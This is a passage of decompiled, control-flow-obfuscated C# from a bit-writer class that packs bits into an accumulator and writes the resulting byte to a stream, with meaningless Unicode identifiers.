        while (true)
        {
          switch (num2)
          {
            case 0:
              num1 |= _param1 & 1;
              num2 = 1;
              continue;
            case 1:
              _param1 >>= 1;
              num2 = 2;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_3;
          }
        }
      }
      this.\uE001(num1, _param2);
    }

    internal void \uE003()
    {
      if (this.\uE001 <= 0)
        return;
label_2:
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\uE000.WriteByte((byte) this.\uE000);
            num = 1;
            continue;
          case 1:
            this.\uE000 = 0U;
            num = 2;
            continue;
          case 2:
            goto label_6;
          default:
            goto label_2;
        }
      }
label_6:
      this.\uE001 = 0;
    }
  }
}
